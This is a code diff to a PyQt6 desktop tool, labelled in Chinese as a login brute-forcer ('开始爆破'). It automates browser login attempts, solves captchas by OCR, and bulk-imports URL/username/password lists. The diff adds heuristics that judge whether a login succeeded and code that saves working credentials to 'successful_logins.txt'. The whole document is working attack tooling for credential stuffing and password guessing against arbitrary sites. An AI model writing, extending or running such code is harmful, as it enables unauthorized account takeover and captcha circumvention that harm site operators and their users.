@@ -10,6 +10,7 @@ import re
 from PyQt6 import QtCore, QtWidgets
 from loguru import logger
 from functools import partial
+from typing import Optional, Set, Tuple
 
 # 这里是自己写的库
 from utlis.strEdit import DragDropLineEdit
@@ -43,6 +44,13 @@ class Ui(object):
         }
         self.cdp_call_frame_id = ''
         self.request_count = 0
+        self.success_file_path = Path("successful_logins.txt")
+        self.failed_sites_file_path = Path("unreachable_sites.txt")
+        self.success_file_path.touch(exist_ok=True)
+        self.failed_sites_file_path.touch(exist_ok=True)
+        self.successful_credentials: Set[str] = set()
+        self.unreachable_sites: Set[str] = set()
+        self.batch_loaded_count = 0
 
     # -------- 日志和状态管理函数 --------
     def print_log(self, data):
@@ -56,6 +64,15 @@ class Ui(object):
         self.url_queue.clear()
         self.task_list.clear()
         self.announcement.clear()
+        if hasattr(self, 'success_results'):
+            self.success_results.clear()
+        if hasattr(self, 'failure_results'):
+            self.failure_results.clear()
+        if hasattr(self, 'batch_status_label'):
+            self.batch_status_label.setText("未导入凭证")
+        self.successful_credentials.clear()
+        self.unreachable_sites.clear()
+        self.batch_loaded_count = 0
 
     def resultlogapp(self, data):
         self.result_text.append(data)
@@ -174,11 +191,12 @@ class Ui(object):
                 yzm = [u for u in img_code_url if
                        not u.strip().endswith(('.png', '.gif', '.jpg', '.jpeg', '.ico', '.svg')) and len(u) > 1]
                 if len(img_code_url) == 0 or len(yzm) == 0:
-
+                    self.credentials['username'] = user
+                    self.credentials['password'] = passwd
                     urls = await performjs(page_two_zd, passwd, user)
 
                     await page_two_zd.wait_for_timeout(1000)
-                    await self.urls_is_os(response.status,urls, page_two_zd, setlist, user, passwd)
+                    await self.urls_is_os(response.status, urls, page_two_zd, setlist, user, passwd)
                 else:
                     code_str = await extract_verification_code(yzm, self.ocr, page_two_zd)
 
@@ -186,7 +204,7 @@ class Ui(object):
                     await page_two_zd.wait_for_timeout(1000)
                     self.credentials['username'] = user
                     self.credentials['password'] = passwd
-                    await self.urls_is_os(response.status,urls, page_two_zd, setlist, user, passwd)
+                    await self.urls_is_os(response.status, urls, page_two_zd, setlist, user, passwd)
             except Exception as e:
                 logger.error(f"函数执行异常 {e}")
                 self.announcement.append(f"函数执行异常 {e}")
@@ -222,30 +240,20 @@ class Ui(object):
                 if len(img_code_url) == 0 or len(yzm) == 0:
                     await jsrequest(page_two, namepath, passpath, user, passwd, loginpath)
                     await page_two.wait_for_timeout(1000)
-                    result = (f'status {response.status} title:{await page_two.title()} {page_two.url}'
-                              f'  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}')
-                    self.result_text.append(str(' {}'.format(result)))
-                    logger.info(result)
-                    self.url_queue.discard(setlist)
-                    self.sd_start_log.append("请求队列还剩{}".format(len(self.url_queue)))
-                    timeout = int(self.sd_delay_text.text()) * 1000
-                    await page_two.wait_for_timeout(timeout)
-                    await page_two.close()
+                    submission_result = {'status': True, 'message': '手动触发'}
+                    await self.urls_is_os(response.status, submission_result, page_two, setlist, user, passwd)
                 else:
                     code_str = await extract_verification_code(yzm, self.ocr, page_two)
                     await jsrequest_code(page_two, namepath, passpath, yzmpath, user, passwd, code_str, loginpath)
                     await page_two.wait_for_timeout(1000)
-                    result = (f'status {response.status} title:{await page_two.title()} {page_two.url}'
-                              f'  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}')
-                    self.result_text.append(str(' {}'.format(result)))
-                    logger.info(result)
-                    self.url_queue.discard(setlist)
-                    self.sd_start_log.append("请求队列还剩{}".format(len(self.url_queue)))
+                    submission_result = {
+                        'status': True,
+                        'message': '手动触发并填写验证码',
+                        'details': {'code': code_str}
+                    }
                     self.credentials['username'] = user
                     self.credentials['password'] = passwd
-                    timeout = int(self.sd_delay_text.text()) * 1000
-                    await page_two.wait_for_timeout(timeout)
-                    await page_two.close()
+                    await self.urls_is_os(response.status, submission_result, page_two, setlist, user, passwd)
             except Exception as e:
                 logger.error(e)
                 self.announcement.append(f"函数执行异常 {e}")
@@ -255,46 +263,138 @@ class Ui(object):
                 timeout = int(self.zd_delay_text.text()) * 1000
                 await page_two.wait_for_timeout(timeout)
                 await page_two.close()
+                self.record_unreachable_site(url, f"请求异常: {e}")
+
+    def _normalize_submission_result(self, result) -> Tuple[bool, str]:
+        """将不同类型的提交结果统一为 (是否提交, 描述)"""
+        if isinstance(result, dict):
+            submitted = bool(result.get('status'))
+            message = result.get('message', '')
+        elif isinstance(result, list):
+            submitted = any('isok' in str(item).lower() for item in result)
+            message = ' / '.join(map(str, result))
+        else:
+            submitted = bool(result)
+            message = str(result)
+        return submitted, message
+
+    async def detect_login_outcome(self, page, status: Optional[int], initial_url: str,
+                                   username: str, password: str) -> Tuple[bool, str]:
+        """根据页面状态和常见特征判断登录是否成功"""
+        try:
+            current_url = page.url or ''
+            html = await page.content()
+            title = await page.title()
+        except Exception as exc:
+            return False, f"无法获取页面信息: {exc}"
+
+        html_lower = html.lower()
+        url_lower = current_url.lower()
+        title_lower = (title or '').lower()
+
+        success_keywords = [
+            'logout', 'sign out', 'signout', '退出登录', '退出系', '注销', '欢迎', 'dashboard',
+            '控制台', '个人中心', '安全退出', '帐号信息', '已登录', '用户中心'
+        ]
+        failure_keywords = [
+            'login failed', 'invalid password', '验证码错误', '失败', '错误', 'error', '未登录',
+            'try again', 'incorrect', 'unauthorized', 'forbidden', 'not allowed'
+        ]
+
+        for keyword in success_keywords:
+            if keyword in html_lower or keyword in url_lower or keyword in title_lower:
+                return True, f"命中成功关键词: {keyword}"
+
+        if initial_url and current_url and current_url != initial_url:
+            blocked_words = ['login', 'signin', 'error', 'fail', 'captcha']
+            if not any(word in url_lower for word in blocked_words):
+                return True, '登录后跳转到新的页面'
+
+        try:
+            password_field = await page.query_selector("input[type='password']")
+        except Exception:
+            password_field = None
+
+        if password_field is None and 'login' not in url_lower and 'signin' not in url_lower:
+            return True, '登录表单已消失'
+
+        for keyword in failure_keywords:
+            if keyword in html_lower or keyword in url_lower or keyword in title_lower:
+                return False, f"命中失败关键词: {keyword}"
+
+        if status and status >= 400:
+            return False, f"HTTP状态码异常: {status}"
+
+        return False, '未检测到成功信号'
+
+    def record_successful_login(self, url: str, username: str, password: str, reason: str) -> None:
+        entry = f"{url} | {username} | {password} | {reason}"
+        if entry in self.successful_credentials:
+            return
+        self.successful_credentials.add(entry)
+        if hasattr(self, 'success_results'):
+            self.success_results.append(entry)
+        try:
+            with self.success_file_path.open('a', encoding='utf-8') as file:
+                file.write(entry + '\n')
+        except Exception as exc:
+            logger.error(f"写入成功凭证失败: {exc}")
+
+    def record_unreachable_site(self, url: str, reason: str) -> None:
+        entry = f"{url} | {reason}"
+        if entry in self.unreachable_sites:
+            return
+        self.unreachable_sites.add(entry)
+        if hasattr(self, 'failure_results'):
+            self.failure_results.append(entry)
+        try:
+            with self.failed_sites_file_path.open('a', encoding='utf-8') as file:
+                file.write(entry + '\n')
+        except Exception as exc:
+            logger.error(f"写入失败站点信息失败: {exc}")
 
     async def urls_is_os(self, status, urls, page, credentials, username, password):
-        if len(urls) != 0:
-            try:
-                result = (f'状态码:{status} 标题:{await page.title()} {page.url} '
-                         f'长度:{len(await page.content())} '
-                         f'用户名:{username} 密码:{password}')
+        submitted, submission_message = self._normalize_submission_result(urls)
+        url = credentials[0]
+        success, reason = await self.detect_login_outcome(page, status, url, username, password)
+        log_widget = self.zd_start_log if self.tabWidget_mode.currentIndex() == 0 else self.sd_start_log
 
-                logger.info(f"状态码:{status} 标题:{await page.title()} {page.url} "
-                          f"长度:{len(await page.content())} "
-                          f"用户名:{username} 密码:{password}")
+        try:
+            content_length = len(await page.content())
+            title = await page.title()
+            current_url = page.url
+        except Exception:
+            content_length = 0
+            title = ''
+            current_url = url
 
-                self.result_text.append(str(' {}'.format(result)))
+        result = (f'状态码:{status} 标题:{title} {current_url} '
+                  f'长度:{content_length} 用户名:{username} 密码:{password} '
+                  f'提交:{submitted}({submission_message}) 判定:{reason}')
 
-                timeout = int(self.zd_delay_text.text()) * 1000
-                await page.wait_for_timeout(timeout)
-                await page.context.clear_cookies()
-                await page.close()
-                self.request_count += 1
-                self.url_queue.discard(credentials)
-                self.zd_start_log.append(f"请求队列还剩{len(self.url_queue)}")
-            except Exception as e:
-                logger.error(f"获取状态码失败: {e}")
-                result = (f'title:{await page.title()} {page.url}  '
-                          f'长度:{len(await page.content())} '
-                          f'账户:{username} 密码:{password}')
-                self.result_text.append(str(' {}'.format(result)))
-                self.zd_start_log.append("{} 请求失败".format(credentials))
-                self.zd_start_log.append("队列还剩{}".format(len(self.url_queue)))
-                timeout = int(self.zd_delay_text.text()) * 1000
-                await page.wait_for_timeout(timeout)
-                await page.close()
+        self.result_text.append(result)
+        logger.info(result)
+
+        if success:
+            self.record_successful_login(url, username, password, reason)
         else:
-            timeout = int(self.zd_delay_text.text()) * 1000
-            await page.wait_for_timeout(timeout)
+            failure_reason = reason
+            if not submitted:
+                failure_reason = f"未能自动提交表单 ({submission_message or '无'})"
+            if status and status >= 400:
+                failure_reason = f"HTTP状态码:{status}"
+            self.record_unreachable_site(url, failure_reason)
+
+        timeout = int(self.zd_delay_text.text() if self.tabWidget_mode.currentIndex() == 0 else self.sd_delay_text.text()) * 1000
+        await page.wait_for_timeout(timeout)
+        try:
             await page.context.clear_cookies()
-            await page.close()
-            self.request_count += 1
-            self.url_queue.discard(credentials)
-            self.zd_start_log.append("请求队列还剩{}".format(len(self.url_queue)))
+        except Exception:
+            pass
+        await page.close()
+        self.request_count += 1
+        self.url_queue.discard(credentials)
+        log_widget.append(f"请求队列还剩{len(self.url_queue)}")
 
     # -------- 验证码处理函数 --------
     async def add_to_captcha_retry(self):
@@ -417,6 +517,31 @@ class Ui(object):
                         for pay in password:
                             self.url_queue.add((targets, name, pay))
         # 暂停，重启按钮
+
+    def load_batch_file(self):
+        file_path, _ = QFileDialog.getOpenFileName(None, "选择批量凭证文件", "", "Text Files (*.txt);;All Files (*)")
+        if not file_path:
+            return
+
+        loaded = 0
+        failed_lines = 0
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
+            for line in file:
+                parts = [segment.strip() for segment in re.split(r'[\t,]', line.strip()) if segment.strip()]
+                if len(parts) < 3:
+                    failed_lines += 1
+                    continue
+                url, username, password = parts[:3]
+                url = url if url.startswith(('http://', 'https://')) else f'http://{url}'
+                self.url_queue.add((url, username, password))
+                loaded += 1
+
+        self.batch_loaded_count += loaded
+        status_message = f"成功导入{loaded}条凭证"
+        if failed_lines:
+            status_message += f"，忽略{failed_lines}条格式错误数据"
+        self.batch_status_label.setText(status_message)
+        self.print_log(status_message)
 
     def blastingmode_cdp(self, mode: str):
         code = self.cdp_req_raw_text.toPlainText()
@@ -839,7 +964,7 @@ class Ui(object):
         self.start_button.setObjectName("start_button")
         self.announcement = QtWidgets.QTextBrowser(self.centralwidget)
         # self.announcement.setEnabled(False)
-        self.announcement.setGeometry(QtCore.QRect(680, 350, 560, 131))
+        self.announcement.setGeometry(QtCore.QRect(680, 350, 560, 80))
 
         self.announcement.setReadOnly(True)
         self.announcement.setObjectName("announcement")
@@ -851,6 +976,28 @@ class Ui(object):
         self.target_url.setCursorPosition(26)
         self.target_url.setPlaceholderText("")
         self.target_url.setObjectName("target_url")
+        self.batch_file_button = QtWidgets.QPushButton(self.centralwidget)
+        self.batch_file_button.setGeometry(QtCore.QRect(610, 50, 90, 30))
+        self.batch_file_button.setObjectName("batch_file_button")
+        self.batch_status_label = QtWidgets.QLabel(self.centralwidget)
+        self.batch_status_label.setGeometry(QtCore.QRect(600, 90, 120, 40))
+        self.batch_status_label.setWordWrap(True)
+        self.batch_status_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignTop)
+        self.batch_status_label.setObjectName("batch_status_label")
+        self.success_label = QtWidgets.QLabel(self.centralwidget)
+        self.success_label.setGeometry(QtCore.QRect(680, 430, 560, 20))
+        self.success_label.setObjectName("success_label")
+        self.success_results = QtWidgets.QTextBrowser(self.centralwidget)
+        self.success_results.setGeometry(QtCore.QRect(680, 450, 560, 80))
+        self.success_results.setReadOnly(True)
+        self.success_results.setObjectName("success_results")
+        self.failure_label = QtWidgets.QLabel(self.centralwidget)
+        self.failure_label.setGeometry(QtCore.QRect(680, 530, 560, 20))
+        self.failure_label.setObjectName("failure_label")
+        self.failure_results = QtWidgets.QTextBrowser(self.centralwidget)
+        self.failure_results.setGeometry(QtCore.QRect(680, 550, 560, 80))
+        self.failure_results.setReadOnly(True)
+        self.failure_results.setObjectName("failure_results")
         self.tabWidget_user_passwd = QtWidgets.QTabWidget(self.centralwidget)
         self.tabWidget_user_passwd.setGeometry(QtCore.QRect(680, 50, 560, 270))
         self.tabWidget_user_passwd.setObjectName("tabWidget_user_passwd")
@@ -985,6 +1132,10 @@ class Ui(object):
         self.start_button.setText(_translate("MainWindow", "开始爆破"))
 
         self.target_url.setText(_translate("MainWindow", "http://127.0.0.1/login.php"))
+        self.batch_file_button.setText(_translate("MainWindow", "批量导入"))
+        self.batch_status_label.setText(_translate("MainWindow", "未导入凭证"))
+        self.success_label.setText(_translate("MainWindow", "登录成功结果"))
+        self.failure_label.setText(_translate("MainWindow", "无法访问或自动登录失败的网站"))
         self.Load_file_button_user.setText(_translate("MainWindow", "Load"))
         self.Clear_list_button_user.setText(_translate("MainWindow", "Clear"))
         self.Paste_text_button_user.setText(_translate("MainWindow", "Paste"))
@@ -1016,6 +1167,7 @@ class Ui(object):
 
         # 导出按钮
         self.export_button.clicked.connect(lambda: self.export_log())
+        self.batch_file_button.clicked.connect(lambda: self.load_batch_file())
         # button 按钮
         self.zd_browser_button.clicked.connect(lambda: self.get_head())
         self.sd_browser_button.clicked.connect(lambda: self.get_head())
